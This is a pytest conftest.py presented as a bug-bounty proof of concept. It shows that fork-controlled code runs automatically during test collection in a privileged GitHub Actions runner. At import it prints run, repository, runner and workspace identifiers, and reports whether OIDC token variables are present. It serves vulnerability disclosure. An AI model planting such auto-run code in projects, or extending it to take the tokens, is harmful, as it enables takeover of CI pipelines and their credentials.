"""H1-3730634 proof-of-concept conftest.

This file is auto-collected by pytest during test discovery inside the
`test-source` matrix job in .github/workflows/tests.yml. The print
below appears in the workflow log on databrickslabs-protected-runner-group,
proving that fork-controlled code executes in the privileged base-repo
context with OIDC env vars in scope.

Authorized as a proof-of-concept by HackerOne triager r2197 on report
#3730634, scope-bounded to printing an identifier string (no token
mint, no exfiltration, no external network call). Will be removed
after the triager confirms.
"""

import os
import sys


def _h1_proof_marker() -> None:
    parts = [
        "H1-PoC bankk",
        "report=3730634",
        f"run_id={os.environ.get('GITHUB_RUN_ID', '')}",
        f"repo={os.environ.get('GITHUB_REPOSITORY', '')}",
        f"runner={os.environ.get('RUNNER_NAME', '')}",
        f"workspace={os.environ.get('GITHUB_WORKSPACE', '')}",
        f"oidc_url_set={'yes' if os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL') else 'no'}",
        f"oidc_token_set={'yes' if os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN') else 'no'}",
    ]
    line = " ".join(parts)
    # Write to stdout so it lands in the pytest collection output.
    print(line, flush=True)
    # Mirror to stderr so it surfaces even if pytest captures stdout.
    print(line, file=sys.stderr, flush=True)


_h1_proof_marker()
